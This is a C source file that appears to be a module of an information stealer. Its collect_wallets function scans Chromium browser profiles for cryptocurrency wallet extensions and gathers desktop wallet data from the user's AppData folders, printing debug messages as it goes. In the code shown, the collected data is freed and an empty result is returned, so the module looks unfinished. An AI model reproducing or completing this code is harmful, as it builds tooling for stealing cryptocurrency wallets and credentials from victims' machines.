#include "wallets.h"
#include "wallet_ext.h"
#include "wallet_desktop.h"
#include "browser_paths.h"
#include "config.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

CollectResult collect_wallets(const char *local_app_data, const char *roaming_app_data) {
    CollectResult result = {0};
    
    dbg_printf("  [wallets] collecting extensions...\n"); fflush(stdout);
    
    // Collect from browser extensions
    size_t browser_count;
    const BrowserPath *browsers = get_chromium_browsers(&browser_count);
    dbg_printf("  [wallets] %zu browsers to scan\n", browser_count); fflush(stdout);
    
    for (size_t i = 0; i < browser_count; i++) {
        const char *app_data = browsers[i].use_roaming ? roaming_app_data : local_app_data;
        
        size_t ext_count = 0;
        WalletExtData *ext_wallets = collect_wallet_extensions(app_data, browsers[i].path_suffix, &ext_count);
        if (ext_wallets) {
            free(ext_wallets);
        }
    }
    
    dbg_printf("  [wallets] collecting desktop...\n"); fflush(stdout);
    // Collect desktop wallets
    size_t desk_count = 0;
    WalletDesktopData *desk_wallets = collect_wallet_desktop(roaming_app_data, &desk_count);
    if (desk_wallets) {
        free(desk_wallets);
    }
    dbg_printf("  [wallets] desktop done: %zu\n", desk_count); fflush(stdout);
    
    return result;
}

void free_wallet_result(CollectResult *result) {
    for (size_t i = 0; i < result->count; i++) {
        free(result->data[i].browser_name);
        free(result->data[i].profile_name);
    }
    free(result->data);
}
